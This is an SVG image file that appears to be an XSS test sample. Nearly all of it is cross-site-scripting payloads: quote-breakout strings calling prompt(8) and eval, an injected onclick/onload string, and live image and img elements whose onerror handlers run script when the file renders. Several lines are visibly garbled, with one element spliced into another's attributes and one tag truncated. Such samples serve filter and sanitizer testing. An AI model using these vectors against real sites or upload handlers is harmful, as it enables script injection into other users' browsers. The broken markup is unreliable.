<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
  <text x="10" y="20" fill="black">"-prompt(8)-"</text>
  <text x="10" y="50" fill="black">'-prompt(8)-'</text>
  <text x="10" y="80" fill="black">";a=prompt,a()//</text>
  <text x="10" y="110" fill="black">';a=prompt,a()//</text>
  <text x="10" y="140" fill="black">'-eval("windowxt x="10" y="170" fill="black">"-eval("window ")-"</text>
  <t fill="black">"onclick=prompt(8)>"@x.y</text>
  <text x="10" y="230" fill="black">"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y</text>
  
  <!-- Example of an <image> with onerror -->
  <image x="10" y="260" width="100" height="100" href="#" onerror="prompt(8)"></image>
  <image x="120" y="260" width="100" height="100" href="invalid" onerror="prompt(8)"></image>
  
  <!-- Example of an <img> inside a foreignObject -->
  <foreignObject x="10" y="370" width="200" height="200">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src="#" onerror="prompt(8)" alt="Image not loaded" width="100" height="100">
      <img src="invalid" onerror="prompt(8)" alt="Invalid Image" width="100" height="100">
    </body>
  </foreignObject>
</svg>
